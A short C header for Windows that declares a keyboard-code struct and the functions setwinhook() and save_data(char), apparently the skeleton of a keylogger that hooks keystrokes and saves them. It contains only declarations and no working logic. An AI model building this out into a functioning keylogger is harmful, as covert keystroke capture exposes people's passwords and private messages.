#pragma once

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <io.h>

struct keyboard
{
	DWORD code;
	char *character;
};

void	setwinhook();
void	save_data(char);